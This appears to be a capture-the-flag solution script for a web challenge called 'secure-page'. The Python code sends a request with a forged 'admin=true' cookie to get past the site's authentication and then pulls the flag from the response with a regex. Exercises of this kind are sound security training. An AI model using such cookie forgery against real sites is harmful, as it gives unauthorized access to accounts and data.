'''
My new website uses cookies for authentication. Now nobody can get in! secure-page.mc.ax
'''

# Solution
# All we had to do was set an admin cookie to true, then send a get request

import requests
import re

def main():
  resp = requests.get('https://secure-page.mc.ax/', cookies={'admin': 'true'})

  flag_regex = r'hope{.*}'
  flag = re.search(flag_regex, resp.text)[0]
  print(flag)

if __name__ == '__main__':
  main()
